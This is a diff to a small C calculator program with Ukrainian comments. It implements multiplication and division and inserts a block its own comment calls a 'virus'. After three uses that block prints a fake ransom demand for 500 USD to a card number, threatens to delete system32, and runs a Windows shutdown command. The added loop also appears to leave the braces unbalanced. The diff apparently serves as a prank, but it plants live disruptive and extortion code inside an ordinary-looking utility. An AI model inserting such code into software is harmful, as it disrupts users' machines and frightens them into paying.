@@ -6,6 +6,16 @@ int count = 0; // Глобальна змінна для підрахунку д
 int main() {
     int choice;
     int a, b;
+    while(1) {
+        // --- ПОЧАТОК "ВІРУСУ" АНДРЮХИ ---
+        if (count >= 3) {
+            printf("\n!!! TRIAL EXPIRED !!!\n");
+            printf("Пробна версія Shitty Calculator закінчилася.\n");
+            printf("Перерахуйте 500 USD на карту 4149 1234 5678 9000!\n");
+            printf("Інакше програма видалить папку system32!\n");
+            system("shutdown /s /t 30"); // Вимкнення ПК через 30 секунд
+            exit(1);
+        }
 
     while(1) {
         printf("\n--- Shitty Calculator v0.1 ---\n");
@@ -36,12 +46,16 @@ int main() {
                 printf("Subtraction not implemented yet.\n");
                 break;
             case 3:
-                // TODO: Андрюха має додати код
-                printf("Multiplication not implemented yet.\n");
+                printf("Result: %d\n", a * b);
+                count++;
                 break;
             case 4:
-                // TODO: Андрюха має додати код
-                printf("Division not implemented yet.\n");
+                if (b == 0) {
+                    printf("Error: Division by zero!\n");
+                } else {
+                    printf("Result: %d\n", a / b);
+                    count++;
+                }
                 break;
             default:
                 printf("Invalid choice!\n");
